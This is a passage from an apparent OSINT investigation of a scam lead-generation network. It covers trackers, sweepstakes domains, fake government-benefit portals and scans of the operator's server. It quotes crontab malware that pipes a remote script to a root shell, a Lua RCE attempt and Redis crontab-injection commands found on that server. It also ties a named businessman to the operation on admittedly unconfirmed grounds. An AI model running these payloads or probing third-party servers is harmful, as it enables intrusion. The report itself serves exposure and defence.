The epicfunnels.net domain had content in March 2024, but WHOIS shows registration in August 2025. This means either: (a) the domain was transferred between operators, or (b) WHOIS data was refreshed during a registrar change.

### phef6trk.com: Multi-Campaign Affiliate Tracker

Wayback Machine captured **19 tracker URLs** revealing the full scale of the CPA operation. This was **not a single-campaign tracker** — it served at least 6 different affiliate accounts:

**Affiliate IDs found in tracker paths:**
- `FGK5P4` (used by epicfunnels.net — the current scam)
- `361GFK`
- `JNS98R`
- `KZDWFR`
- `R1HQJL`
- `THFD9F`
- `7LKLK3`

**Campaign IDs:**
- `2Z57CD5`, `24X9WZ1`, `2JSKXKP`, `2M5TG68`, `2RX68SJ`, `JHMHC2`

**Parameter intelligence from archived URLs:**
- `__po` values (610, 611, 612, 628, 704, 709) — likely offer IDs within the CPA network
- `__ptid` values are UUIDs — per-session tracking identifiers
- `sub1` contains what appear to be publisher IDs or hex strings (`42358`, `47429`, `51398`, `18603`, `6823cf198c7f65155e8a7999`)
- `sub2` contains placement/creative IDs (`108198994`, `108156414`, `109576632`, `108389497`)
- `source_id` field exists but is usually empty
- `__rpt=0&__rpa=0&__rc=1` appear to be anti-fraud parameters (repeat=0, reported=0, count=1)

One URL shows a completely different structure: `/7LKLK3/JHMHC2/?creative_id=3530&uid=68&sub2=69525cd14f95d10001b38125&sub1=3226` — this uses `creative_id` and `uid` parameters instead of the `__po/__ptid` system, suggesting the tracker served multiple CPA networks or had multiple API versions.

### mydailysurge.com: Sweepstakes Operation

Wayback Machine archived URLs confirm mydailysurge.com runs sweepstakes:
- `/sweepstakes/terms-and-conditions`
- `/monthly-daily-giveaway-rules`
- `/do-not-sell`
- `/p/pz-terms-daily`

Combined with the AMOE system (easyscanamoe.com) and ActiveProspect TCPA verification, this is a **compliant-looking sweepstakes operation** — the legal infrastructure is professionally assembled even though the underlying scam pages are AI-generated garbage.

### Webflow CMS: Identity Leaks

The explore.mydailysurge.com Webflow blog reveals:
- No sitemap.xml (404)
- `/about` page exists (200)
- **`/discover` is password-protected** ("Protected page") — the operator is hiding something behind a Webflow password gate
- `/contact-us` page exists
- Privacy policy links to **activeprospect.com**, **jornaya.com** (lead intelligence platform), and **myamericanprizes.com**
- Terms of use links to **easyscanamoe.com** AMOE system

**Jornaya** is a lead intelligence platform that tracks consumer consent journeys for TCPA compliance. Its presence confirms the operator is generating leads for sale to advertisers who require documented consent chains.

### Microsoft 365: Tenant Deleted

The `MS=ms66511106` TXT record proves the domain was verified against a Microsoft 365 tenant, but the tenant itself returns `invalid_tenant` (AADSTS90002). The operator verified the domain, possibly used M365 for email briefly, then deleted or abandoned the tenant. The conflicting SPF record (`include:spf.protection.outlook.com`) is a ghost from this deleted configuration.

User realm check returns `NameSpaceType: Unknown` — the domain is not federated with any identity provider.

### Social Media: Multi-Platform Presence

HTTP status checks across 4 platforms show **all accounts return 200** (exist):

| Platform | @GetnGoods | @mydailysurge | @theupgradeclub | @jessytheupgradeclub |
|---|---|---|---|---|
| Twitter/X | 200 | 200 | — | — |
| Instagram | 200 | 200 | 200 | 200 |
| TikTok | — | 200 | — | — |
| Facebook | 200 | 200 | — | — |

Also: TikTok @getngoods returns 200. The operation maintains **10+ social media accounts across 4 platforms**.

### Spamhaus: IP Blocklisted

The EC2 IP (`13.220.193.170`) returns `127.255.255.254` on the Spamhaus ZEN DNSBL. This is the **CSS (Combined Spam Sources)** listing — the IP is flagged for sending spam. Not listed on SpamCop, SORBS, or Barracuda.

### SMTP: Port 465 Open (11th Port)

Port 465 (SMTPS/implicit TLS) is **OPEN** — this was not found in the original port scan. The EC2 server now has **11 confirmed open ports**:

```
22 (SSH), 80 (HTTP), 143 (IMAP), 443 (HTTPS), 465 (SMTPS), 587 (SMTP),
993 (IMAPS), 3000 (Node.js), 5432 (PostgreSQL), 6379 (Redis), 8083 (Hestia)
```

SMTP EHLO on 587 leaks internal hostname `ip-172-26-15-175.ec2.internal` and our connecting IP. STARTTLS certificate on 587 is the same self-signed Hestia cert (`fqdn.olivimails.com`). SMTPS on 465 uses the same cert.

VRFY command returns "Administrative prohibition" (disabled). RCPT TO validation requires sender verification first — Exim's sender callout verification is enabled, which is actually a reasonable anti-spam measure. The irony of a spam operation running anti-spam measures on its own mail server.

### Lovable AI: Project ID Valid

The Lovable OG image hash `p98pqg` is a **valid project identifier** — `/projects/p98pqg` returns HTTP 307 (redirect). The project exists on Lovable's platform. No useful EXIF metadata in the OG image (standard PNG, 1200x629px, palette color).

### Cloudflare: No Intelligence in API Layer

The API redirect (`/api/continue` → phef6trk.com) is a dumb Cloudflare rule with no conditional logic:
- Same redirect regardless of User-Agent (iPhone, Android, desktop, TikTok, Googlebot, curl)
- Same redirect regardless of Accept-Language (English, Spanish, Portuguese, Chinese)
- Same redirect regardless of Referer (TikTok or none)
- Same redirect for GET and POST
- All responses are `cf-cache-status: DYNAMIC` (not cached)

Root domain and jessica subdomain serve **identical content** (SHA-256: `e3a85c35a43afd7735610614a87ff740d766fb83ea00510964437d53eca6d01c`).

Cloudflare diagnostic (`/cdn-cgi/trace`): colo=SJC (San Jose), TLS 1.3, SNI plaintext.

`/_routes.json` and `/functions/` both return 200 — Cloudflare Pages is the hosting platform.

### GTM Container: Google Ads Only

The GTM container (`GTM-N3JVLCTN`, 373KB) contains:
- Google Analytics: `G-BSTM4RV28F` (the only GA ID)
- Google Ads / DoubleClick conversion tracking
- References to `veinteractive.com` (Ve Global retargeting platform)
- No Facebook pixel, no TikTok pixel, no third-party tracking
- The scam page itself has **zero tracking** — no GA, no GTM, no pixels. Only the SEO blog tracks visitors.

### GCS Buckets: Limited Product Library

Both GCS buckets (`b.noodledit.com`, `sassets.noodledit.com`) are accessible via `storage.googleapis.com` directly (200). Brute-force enumeration of product names (Samsung, iPad, PlayStation, Xbox, gift cards, etc.) found no additional products. The operation currently only has iPhone and MacBook variants.

### CPA Network Analysis

ActiveProspect verification decodes to 16-byte value (UUID): `33e9946204c3129af10d401d71da1b2c`.

phef6trk.com DNS now includes an **IPv6 sinkhole address**: `fd25:ef1b:4b44:1::1` (in addition to the IPv4 `10.0.0.1`). Both A and AAAA records point to sinkhole addresses. NS records, MX, TXT, and SOA are all empty — the domain has been completely scrubbed.

### Coordinated Engagement Bot Network (Live, 2026-04-08)

During the investigation, the investigator's personal TikTok account received **multiple likes on old comments from separate accounts**, all within a short time window. This is live evidence of a coordinated engagement farming operation.

**Observed behavior:**
- "The Upgrade Club" (@jessytheupgradeclub) liked old comments
- "IDREES NAJIBI" liked old comments around the same time
- Additional accounts continued liking old comments throughout April 8, 2026
- The likes targeted comments the investigator had made on various videos — not just The Upgrade Club's own content

**Why this matters:**

TikTok does not expose a public "all comments by user" view. A normal user cannot browse someone's comment history across videos. To find and like a specific user's old comments scattered across different videos, you need one of:

1. Creator access to the videos (you can see all comments on your own content)
2. Manual scrolling through thousands of comments on specific videos
3. **Scraping tools or engagement automation software** that crawl comment sections and build target lists

Option 3 is the only explanation that accounts for:
- **Multiple unrelated accounts** liking the same user's old comments
- **Simultaneous timing** — the likes arrive in clusters, not randomly
- **Old comments** being found — not recent activity, but historical comments the user made days or weeks ago

**Mechanism:**

The operation maintains a **target list** of TikTok users who have interacted with content in their niche. When a user comments on a video in a relevant space (giveaways, tech drops, free stuff), their username gets scraped into the list. Automated tools then:

1. Find the target user's comments across various videos (via API scraping or comment section crawling)
2. Like those comments from multiple accounts in the network
3. Each like generates a notification on the target's phone: "[Account Name] liked your comment"
4. Curiosity drives the target to tap the notification → view the account profile
5. Profile bio contains a link ("Link in story") → scam funnel → CPA tracker

The accounts are different storefronts for the same operation. We already identified 10+ social media accounts across 4 platforms (Twitter, Instagram, TikTok, Facebook) under the brands GetnGoods, MyDailySurge, and The Upgrade Club.

**The irony:**

The engagement bot network is **still actively running** as of April 8, 2026. The bots are still farming. The target lists are still being worked. But every funnel they drive traffic to ultimately redirects to `phef6trk.com`, which resolves to `10.0.0.1`. The automation is grinding against a sinkholed tracker. The machine runs. The gears turn. Nothing happens.

**Evidence:**
- `tiktok/tiktok-activity-upgrade-club-liked.jpg` — Activity feed showing "The Upgrade Club liked your comment" + "IDREES NAJIBI liked your comment" in the same time window
- `tiktok/tiktok-profile-jessytheupgradeclub.jpg` — The Upgrade Club profile (58.4K followers, "Link in story")
- `tiktok/tiktok-comments-sword-guy.jpg` — Comment section where investigator was present (248 comments)

### Updated Statistics

```
Domains:               6  (was 5 — myamericanprizes.com discovered)
Subdomains:           21+ (historical)
Open ports on EC2:    11  (was 10 — port 465 discovered)
Social media accounts: 10+ across 4 platforms
Affiliate IDs:         7  (discovered via Wayback Machine)
Campaign IDs:          6+ (discovered via Wayback Machine)
Wayback snapshots:   116  (across all domains/subdomains)
Oldest evidence:      December 2023 (app.epicfunnels.net)
Spamhaus status:      LISTED (CSS)
M365 tenant:          DELETED
Bot network:          ACTIVE (still farming engagement into a sinkhole)
Working parts:         0
```

## Network Probe #3 (2026-04-09 04:20 UTC)

Full-spectrum network reconnaissance. Raw data in `artifacts/probe-2026-04-08/`.

### CRITICAL: Redis Contains Cryptojacking Malware

The 4 Redis keys (`backup1`-`backup4`) are **crontab-formatted malware injection payloads**:

```
backup1: */2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup2: */3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup3: */4 * * * * root curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
backup4: */5 * * * * root wd1 -q -O- http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
```

This is a classic Redis crontab injection attack — automated botnets write cron entries into unauthenticated Redis, then `CONFIG SET dir /var/spool/cron/` to dump them as root's crontab. `cd1`/`wd1` are obfuscated `curl`/`wget` (malware renames binaries to evade detection).

The C2 domain `oracle.zzhreceive.top` is **dead** — no DNS, WHOIS says "does not exist" (expired .top domain via ZDNS registry). Redis CONFIG shows `dir=/data`, `dbfilename=dump.rdb` — Docker container defaults. The attack likely **failed** because the container filesystem can't reach `/var/spool/cron/`. But it proves the open Redis was found and exploited by automated malware scanners.

### CRITICAL: GCS Bucket `b.noodledit.com` — 747-Asset Scam Factory

Both GCS buckets are **publicly listable** (no auth required on `storage.googleapis.com`):

- **b.noodledit.com**: 747 objects, 122.4 MB, date range 2024-10-22 to **2026-04-08 (today)**
- **sassets.noodledit.com**: 28 objects, focused on MyDailySurge/PrizeZappy

Most recent uploads (within 48 hours of probe):
```
2026-04-08  creditcard.png
2026-04-06  OPG Housing.jpg, Picture2.jpg
2026-04-01  icon_phone.svg
2026-03-31  starbucks500.svg
2026-03-30  celinepurse.png, kawasakimotorcycle.png, hermespurse.png,
            norwegiancruiselinecruise.png, fordmavericktruck.png
```

#### 15+ Brand Names in Asset Inventory

| Brand | Category | Evidence |
|-------|----------|----------|
| GetnGoods | Sweepstakes | Known (jessica.epicfunnels.net) |
| MyDailySurge | Lead gen | Known (explore.mydailysurge.com) |
| PrizeZappy | Sweepstakes | logo_prizezappy.svg, Prize Zappy.svg |
| SnagNGoods | Sweepstakes | GetnGoods variant |
| PrizeZar | Sweepstakes | prizezar*.svg |
| PlayZoodle | Gaming | playzoodle_favicon.png (2026-03-20) |
| HealthPlanScouts | Health insurance | healthplanscouts_dark_logo.svg |
| Fresh Health Plan | Health insurance | logo_freshhealthplan.svg (2026-03-11) |
| LendliV2 | Lending/loans | LendliV2.svg |
| Prismique | Unknown | New prismique logo.svg |
| CheckGo | Unknown | CheckGo.svg |
| BenefitsAccessCenter | Gov benefits | benefitsaccesscenter*.svg |
| TheDailyTipJar | Unknown | thedailytipjar*.svg |
| OPG Housing | Housing assistance | OPG Housing.jpg (2026-04-06) |
| CustomerTestConnect | Platform backend | myamericanprizes.com error page title |

#### Promotion Categories (from `promotions/` directory)

**Gift Cards**: Amazon $500/$1000, Walmart $750/$1000, Kroger $1000, Target, Dollar Tree $1000, Chipotle, Chick-fil-A $750, Publix $750, Casey's $750, Red Lobster $1000, Outback $1000, McDonald's, Starbucks $500, Macy's, Shein, Speedway $750

**Vehicles**: GMC Canyon, Ford Maverick, Nissan Frontier, Chevrolet Colorado, Toyota RAV4, Corvette, Honda motorcycle, Indian Scout motorcycle, Kawasaki motorcycle

**Luxury**: Celine purse, Hermes purse, E.l.f. cosmetics, perfume set, Ticketmaster, bedding set $1000

**Gas Stations**: BP $750, Shell $750, Exxon $750, Speedway $750, gas card $500/$1000

**Government Benefits Scams**: Food stamps/SNAP, inflation relief, stimulus checks, unemployment, rental assistance, student aid, startup grants, senior benefits, child/family assistance, tariff relief, unclaimed money

**Electronics**: iPhone 17 Pro Max, MacBook, PlayStation 5, Samsung, Nintendo, JBL PartyBox 310, DeWalt, E-Bike, Smart Walking Stick

**Travel**: Norwegian cruise line, Princess Cruises

This is not a sweepstakes operation with a few gift card prizes. This is an **industrial-scale, multi-vertical CPA lead generation factory** spanning consumer goods, vehicles, luxury items, gas rewards, government benefits fraud, health insurance, lending, and gaming.

### CRITICAL: Operating Entity Identified — Moxxi Media

myamericanprizes.com DKIM selectors reveal the Microsoft 365 tenant name:

```
selector1._domainkey → selector1-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
selector2._domainkey → selector2-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
```

**Moxxi Media** (`moxximedia.onmicrosoft.com`) is the entity operating myamericanprizes.com. The domain `moxximedia.com` is **not registered** — they only exist as a Microsoft 365 tenant. M365 tenant verification: `MS=ms46839871`.

Additional myamericanprizes.com intelligence:
- **Platform**: Express.js (Node.js) with Handlebars templates
- **Error page title**: "Oops - CustomerTestConnect" (the backend platform name)
- **Theme directory**: `/themes/myamericanprizes/`
- **ActiveProspect verification**: `DdrUnuCT8xESAT7uOdJmqg==`
- **Apple domain verification**: `ySS9fHR4xXuFRiE0`
- **DMARC**: `p=none` with reporting to Cloudflare
- **MX**: `myamericanprizes-com.mail.protection.outlook.com` (M365 Exchange)
- **Autodiscover**: Full M365 integration (autodiscover.outlook.com)

Note: epicfunnels.net has a **different** M365 tenant (`MS=ms66511106`, now deleted) while myamericanprizes.com uses `MS=ms46839871` (Moxxi Media, active). Two separate M365 tenants.

### Domain Registration Timeline (WHOIS)

| Domain | Created | Registrar | Expires | Status |
|--------|---------|-----------|---------|--------|
| myamericanprizes.com | **2023-08-22** | GoDaddy | 2026-08-22 | Active, full lock |
| phef6trk.com | 2024-06-25 | Squarespace | 2026-06-25 | Sinkholed, DNSSEC |
| noodledit.com | 2024-10-18 | Cloudflare | 2026-10-18 | Active (GCS CDN only) |
| mydailysurge.com | 2025-03-19 | Cloudflare | **2027-03-19** | Active, renewed 2 yrs |
| epicfunnels.net | 2025-08-26 | Sav.com | 2026-08-26 | Active |
| olivimails.com | — | — | **EXPIRED** | No WHOIS match |

Key: myamericanprizes.com is the **oldest domain** (Aug 2023). noodledit.com, mydailysurge.com, and myamericanprizes.com share **identical Cloudflare nameservers** (cass/felicity) — same Cloudflare account. olivimails.com has **expired** but the EC2 still uses it as the Hestia hostname.

### SSL Certificate Findings

**mydailysurge.com has 35 SANs** — a daily rotation scheme:

```
DNS: mydailysurge.com, www.mydailysurge.com, signup.mydailysurge.com,
     trck.mydailysurge.com, 1.mydailysurge.com through 31.mydailysurge.com
```

One subdomain per day of the month. All numbered subdomains return 404 now — the rotation system is dead.

**noodledit.com cert renewed 4 days ago** (2026-04-04) — infrastructure actively maintained.

**CT log history**: myamericanprizes.com has 42 certs dating to Sep 2023. phef6trk.com has 17 certs (only `www.phef6trk.com`). olivimails.com has **zero** CT entries — never had a proper SSL cert.

### Predatory Targeting of Vulnerable Populations

This section documents the operation's government benefits scam vertical. Evidence: 70 promotional assets in the publicly listable GCS bucket `b.noodledit.com`, 10 captured as image evidence in `artifacts/probe-2026-04-08/gov-benefits-evidence/`.

#### What They're Doing

The operation runs dedicated scam funnels that impersonate government benefit programs. They are not stealing benefits directly. They are targeting people who are actively seeking help — people searching for food stamps, unemployment insurance, rental assistance, student aid — and harvesting their personal information for sale to CPA lead buyers.

The victim is someone who cannot afford groceries, is behind on rent, or just lost their job. They find what appears to be a portal to access government assistance. They enter their name, address, phone number, email, income, household size — exactly the information a real benefits application would ask for. They submit. They receive nothing. Their data enters the CPA lead pipeline. They get spam calls. They get sold to data brokers. The assistance never comes.

#### The Dedicated Brand: BenefitsAccessCenter

The operation has a **standalone brand** purpose-built for this vertical:
- Brand name: BenefitsAccessCenter
- Dedicated favicon: `favicon_benefitsaccesscenter.svg` (uploaded 2025-11-07)
- Branded promotional images with the US Capitol building
- Designed to look like an official government resource

#### 11 Government Benefit Categories

| Category | Key Assets | Imagery |
|----------|-----------|---------|
| **SNAP / Food Stamps** | `snap_bac.png`, `foodstamps_bottom_1/2.png`, `food_assistance_image_bundle.png`, `foodbundle.png` | Grocery stock photos — bananas, eggs, orange juice, bread |
| **Unemployment** | `unemploymentbenefits.png`, `benefitsaccesscenter_promos_unemploymentbenefits.png`, `unemployment_bottom_1/2.png` | Direct deposit screen, US Capitol building, calculator |
| **Rental Assistance** | `rentalassistance.png`, `rental_bottom_1/2.png` | Keys and apartment building |
| **Senior Benefits** | `seniorbenefits.png`, `senior_bottom_1/2.png`, `samples_senior.png` | Medicare card, AARP logo, pill organizer, Centrum Silver |
| **Student Aid** | `studentaid.png`, `studentaid_bottom_1/2.png`, `studentloanrelief.png` | FAFSA form on laptop, calculator, textbooks |
| **Startup Grants** | `startupgrant_v2.png`, `grants_bottom_1/2.png` | A briefcase full of cash |
| **Inflation Relief** | `inflation_relief_topphoto_web/mob.png`, `inflation_bottom_1/2.png` | 6 assets with web + mobile responsive versions |
| **Stimulus Checks** | `resources_stimulus_topphoto_web/mob.png`, `resources_stimulus_bottomphoto_webmob.png` | 5 assets with responsive versions |
| **Tariff Relief** | `tariff_relief_web/mob/web_2x.png`, `tariff_topphoto_web/mob.png`, `tariff_bottom_1/2.png` | **9 assets** — the most heavily produced campaign, including retina 2x |
| **Child/Family Assistance** | `child_family_assistance_img1/2_web/mob.png` | 4 assets at 900KB-2MB each |
| **Unclaimed Money** | `unclaimedmoney_top_web.png`, `unclaimedmoney_bottom_1/2.png` | 3 assets |

Total: **70 assets** dedicated to impersonating government assistance programs.

#### The Production Timeline

The pivot into government benefits scams is visible in the upload dates:

```
2025-09-20  First gov benefit assets: studentloanrelief.png, startupgrant_v2.png
2025-10-01  samples_senior.png — targeting seniors
2025-11-07  favicon_benefitsaccesscenter.svg — BenefitsAccessCenter brand established
2025-12-03  snap_bac.png — SNAP/food stamps targeting begins
2026-01-16  Inflation relief + stimulus — full responsive image sets (web + mobile)
2026-01-28  Tariff relief — 9 assets, heaviest single campaign. Exploiting tariff anxiety.
2026-02-17  MASS UPLOAD: food stamps, inflation, grants, tariff — all at once
2026-02-18  MASS UPLOAD: unemployment, rental, senior, student aid — all at once
2026-02-19  unemploymentbenefits.png
2026-03-10  Medical and financial bundles
2026-04-06  OPG Housing — housing assistance, uploaded 2 days before this probe
```

The operation started with sweepstakes and gift card scams in October 2024. It began testing government benefits lures in September 2025. By February 2026, it went all-in with a coordinated two-day mass upload covering every major federal assistance program. The tariff relief campaign received the most production investment — 9 assets including retina-quality images — because tariff anxiety is high and the operator knows it.

#### The Stock Photo Choices

The imagery is carefully selected to build false trust with vulnerable audiences:

- **Food stamps**: Groceries a family actually needs — bananas, eggs, juice, bread. Not luxury items. The basics.
- **Senior benefits**: Medicare card, AARP branding, pill organizer, blood pressure monitor. Medical necessities for elderly people on fixed incomes.
- **Student aid**: A FAFSA application on a laptop. The exact form a desperate student would be searching for help with.
- **Rental assistance**: Keys and an apartment building. What someone about to be evicted is thinking about.
- **Startup grants**: A briefcase literally full of cash. The most nakedly manipulative image in the set.
- **Unemployment**: A "Direct Deposit" phone screen. Suggesting money is about to arrive.
- **Child/family assistance**: A mother grocery shopping with her small child.

Every image is designed to meet the victim where they already are — anxious, in need, searching for help — and present the scam as the answer.

#### What This Means

This is a CPA lead generation operation that has made a calculated business decision to target people in financial distress. The same infrastructure that runs fake iPhone giveaways for TikTok teenagers also runs fake government benefit portals for people who cannot afford food.

The legal cover is the same across all verticals: ActiveProspect for TCPA consent verification, Jornaya for lead intelligence, AMOE sweepstakes entry for legal compliance. The machinery doesn't care whether it's harvesting data from someone hoping to win an iPhone or someone hoping to feed their children. A lead is a lead. A click is a click.

The BenefitsAccessCenter brand, the professionally produced responsive image sets, the 70 dedicated assets, the two-day mass upload in February 2026 — this is not an afterthought or a test. This is a deliberate, scaled, ongoing campaign to monetize human desperation.

### Updated Statistics

```
Domains:                9  (was 6 — snagalot.com, myamericanprizes1.com, easyscanamoe.com added)
Brand names:           15+ (was 2 — massive expansion from GCS bucket inventory)
GCS bucket objects:   775  (747 + 28 across two buckets)
GCS bucket size:      122.4 MB
Promotion categories:   8  (gift cards, electronics, vehicles, luxury, gas, gov benefits, health, travel)
Last asset upload:     2026-04-08 (day of probe)
Open ports on EC2:    15  (was 11 — FTP 21, DNS 53, POP3 110, POP3S 995 discovered via full 65535 sweep)
Operating entity:      Moxxi Media (moxximedia.onmicrosoft.com)
Platform backend:      CustomerTestConnect (Express.js + Handlebars)
Redis status:          ACTIVE WARZONE — 24 external IPs attacking, 33 FLUSHALL, crontab injection, Lua RCE attempts
Redis connections:     218,219 total (75 days uptime)
Redis commands:        241,737 total, 18,398 errors, 337 FLUSHALL, 1,455 EVAL, 4,355 SLAVEOF
Threat actors:         24 unique external IPs from 6+ countries in slowlog
M365 tenants:          2 (ms66511106 deleted, ms46839871 active)
CT log entries:        130+ (across all domains)
Registrars used:       4 (GoDaddy, Squarespace, Cloudflare, Sav.com)
PostgreSQL:            Requires auth (fe_sendauth for all common users)
Hestia API:            IP-whitelisted (rejects non-whitelisted connections)
Working parts:         0 (monetization still broken — tracker sinkholed)
```

## Third-Party Intelligence (2026-04-08)

Deep research into the companies providing legal cover and compliance infrastructure to the scam operation. Full write-up: **[THIRD-PARTY-INTEL.md](THIRD-PARTY-INTEL.md)**.

### Key Findings

**ActiveProspect + Jornaya are now the same company.** ActiveProspect acquired Verisk Marketing Solutions (parent of Jornaya and Infutor) on January 8, 2026. The two "separate" TCPA compliance vendors referenced in the scam's privacy policy are one entity. Combined, they certify over 1 billion opt-in leads annually. TrustedForm Certify is free for publishers — sign up online, verify your domain via DNS TXT record, no vetting of what the page actually does. The scam has ActiveProspect domain verifications on both epicfunnels.net and myamericanprizes.com.

**SCA Promotions (Dallas, TX) is the prize administrator.** Founded 1986, not BBB accredited. Their EasyScan AMOE system provides the sweepstakes legal wrapper. The mail-in entry address goes directly to SCA's office at 3030 LBJ Freeway, Suite 300, Dallas. They handle the "$1,000 giveaway" — one prize per year, random drawing. SCA is a legitimate company being used to legitimize a scam. Whether they know their client runs fake government benefit portals is an open question.

**The sponsor address is a UPS Store mailbox.** `68 White Street, Suite 7-291, Red Bank, NJ 07701` = The UPS Store #3488. "Suite 7" is the store's suite in the building. "291" is the mailbox number. Both MyAmericanPrizes and MyDailySurge list this as their address. There is no office. Contact: `support@mydailysurge.com`, live Zendesk help center at `mydailysurge.zendesk.com`.

**Moxxi Digital (NYC) is the strongest candidate** for the entity behind `moxximedia.onmicrosoft.com`. Founded by Morris Laniado, ex-Fluent Inc. (NYSE: FLNT). Business model: "promotion-based marketing that drives opt-in lead generation at scale." The M365 tenant says "moxxiMEDIA" but the public company calls itself "moxxiDIGITAL" — possible rebrand, subsidiary, or different entity. Not confirmed, but the business model alignment is exact.

**Three new connected domains**: `snagalot.com` (mirrors giveaway rules), `myamericanprizes1.com` (variant domain), `easyscanamoe.com` (SCA Promotions AMOE system). Total connected domains: **9**.

## Deep Probe (2026-04-09)

6 containerized probes using `redis-cli`, `psql`, `nmap`, `curl`, and Python against the EC2 server. All read-only, standard open-source tools. Raw data in `artifacts/deep-probe-2026-04-08/`.

### CRITICAL: Redis Is an Active Warzone

The exposed Redis 7.4.7 on port 6379 is not just open — it is under **continuous automated attack** from botnets worldwide. The `SLOWLOG` (entries 293-420) and `INFO` commandstats paint the picture of a database that has been discovered by every major Redis exploit scanner on the internet.

**By the numbers:**
- **218,219** total connections received in 75 days of uptime
- **241,737** commands processed, **18,398** errors
- **337** `FLUSHALL` commands — complete database wipes
- **2,731** `FLUSHDB` commands
- **4,355** `SLAVEOF` commands — replication hijack attempts
- **1,455** `EVAL` commands (Lua RCE attempts, **all failed**)
- **10,238** `CONFIG SET` commands (10,086 failed — crontab/dir injection attempts)
- **3,934** `SET` commands (payload injection)
- **893** `SAVE` commands (RDB dump after payload injection)
- **500** cached Lua scripts (from EVAL spam)
- **955** evicted scripts (cache overflow from attack volume)

**24 unique external attacker IPs in the slowlog** (excluding localhost):

| IP | Commands | Country | Attack Type |
|----|----------|---------|-------------|
| 180.76.114.78 | 19 | China (Baidu/Beijing) | FLUSHALL + SAVE + CONFIG SET (crontab injection) |
| 183.6.4.31 | 14 | China (Guangdong) | FLUSHALL + SAVE + COMMAND reconnaissance |
| 113.209.196.69 | 11 | China (Guangdong) | FLUSHALL + SAVE (repeated sessions) |
| 183.56.243.176 | 10 | China (Guangdong) | FLUSHALL + SAVE + COMMAND reconnaissance |
| 120.48.43.118 | 10 | China (Alibaba Cloud) | **CONFIG SET dir /var/spool/cron/crontabs** + CONFIG SET dbfilename httpgd |
| 183.56.219.190 | 8 | China (Guangdong) | FLUSHALL + SAVE + COMMAND |
| 180.76.52.82 | 6 | China (Baidu) | FLUSHALL + SAVE + COMMAND |
| 120.48.35.163 | 5 | China (Alibaba Cloud) | FLUSHALL + SAVE |
| 81.71.51.170 | 4 | China (Tencent Cloud) | FLUSHALL + SAVE |
| 200.188.48.146 | 4 | Mexico | **CONFIG SET stop-writes-on-bgsave-error no** + FLUSHALL |
| 194.163.170.77 | 4 | Germany (Contabo) | SAVE + COMMAND DOCS |
| 14.18.118.84 | 4 | China (Guangdong) | FLUSHALL + SAVE |
| 198.74.62.88 | 2 | USA (Linode) | FLUSHALL + SAVE |
| 180.76.58.237 | 2 | China (Baidu) | FLUSHALL + SAVE |
| 116.153.32.50 | 2 | China (Shanghai) | FLUSHALL + SAVE |
| 47.94.213.192 | 1 | China (Alibaba Cloud) | SAVE |
| 47.112.215.87 | 1 | China (Alibaba Cloud) | **EVAL package.loadlib** (Lua RCE attempt) |
| 27.185.41.158 | 1 | China (Hebei) | **CONFIG SET dir /etc/cron.d** |
| 3.132.26.232 | 1 | USA (AWS Ohio) | INFO reconnaissance |
| 192.184.150.96 | 1 | USA (Sonic.net) | INFO reconnaissance (this is us) |
| 130.131.161.238 | 1 | USA | INFO reconnaissance |
| 120.48.174.141 | 1 | China (Alibaba Cloud) | SAVE |
| 118.196.34.36 | 1 | China | COMMAND reconnaissance |
| 111.90.158.78 | 1 | Malaysia | FLUSHALL |

**Attack types observed:**

1. **Crontab injection** (120.48.43.118, 27.185.41.158): `CONFIG SET dir /var/spool/cron/crontabs` then `CONFIG SET dbfilename httpgd` then `SAVE` — writes the Redis DB as a crontab file. The existing `backup1`-`backup4` malware keys are the payloads. **Failed** because Redis runs in Docker (`dir=/data`, PID 1) and cannot reach the host crontab.

2. **Lua RCE** (47.112.215.87): `EVAL "local ver = string.match(_VERSION,'%d.%d');local io_l = package.loadlib(string.format('/usr/lib/x86_64-linux-gnu/liblua%s.so.0',..."` — attempts to load system libraries via Lua's `package.loadlib` for arbitrary code execution. **Failed** — all 1,455 EVAL calls returned errors.

3. **Replication hijack** (multiple IPs): 4,355 `SLAVEOF` commands attempted to make this Redis a replica of an attacker-controlled server, which would allow injecting arbitrary data. The commandstats show these were executed but the replication state shows `connected_slaves:0`, `role:master` — the server remained standalone.

4. **Data destruction** (widespread): 337 `FLUSHALL` commands from 15+ IPs. The database has been wiped hundreds of times. The 4 malware keys persist because the botnet that planted them keeps re-injecting after each wipe.

5. **Persistence manipulation** (200.188.48.146): `CONFIG SET stop-writes-on-bgsave-error no` — disables the safety check that stops writes when RDB snapshots fail, ensuring malware payloads survive even with disk errors.

**Geographic distribution**: ~75% China (Baidu, Alibaba Cloud, Tencent Cloud, various ISPs in Guangdong/Beijing/Shanghai/Hebei), ~10% USA (AWS, Linode, Sonic.net), plus Germany, Mexico, Malaysia. This is consistent with the global distribution of automated Redis exploit botnets.

### nmap: 15 Open Ports (4 New)

Full 65535-port TCP SYN sweep (`nmap -sS -p- --open -T4 --min-rate 1000`) discovered 4 previously unknown ports:

| Port | Service | New? | Notes |
|------|---------|------|-------|
| 21 | FTP | **YES** | Not previously detected — not probed further |
| 22 | SSH | | OpenSSH 9.2p1 (Debian Bookworm) |
| 53 | DNS | **YES** | Running a nameserver on the EC2 — possibly Hestia's built-in BIND |
| 80 | HTTP | | nginx, TRACE enabled |
| 110 | POP3 | **YES** | Dovecot POP3 access (in addition to IMAP) |
| 143 | IMAP | | Dovecot, cert=fqdn.olivimails.com |
| 443 | HTTPS | | nginx, cert expired, redirects to HTTP |
| 465 | SMTPS | | Exim, AUTH PLAIN LOGIN, leaks internal hostname |
| 587 | SMTP | | Exim submission, STARTTLS, leaks `ip-172-26-15-175.ec2.internal` |
| 993 | IMAPS | | Dovecot, AUTH=PLAIN AUTH=LOGIN |
| 995 | POP3S | **YES** | Dovecot POP3 over SSL |
| 3000 | Node.js | | HTTP 500 on all endpoints — app crashed |
| 5432 | PostgreSQL | | Exposed, requires password |
| 6379 | Redis | | 7.4.7, NO AUTH, under active attack |
| 8083 | Hestia | | Admin panel, IP-whitelisted API |

nmap service version scan (`-sV -sC -O`) confirmed:
- All SSL services use the same Hestia self-signed cert (`CN=fqdn.olivimails.com`)
- SMTP on 465 and 587 both leak the internal hostname in EHLO banner
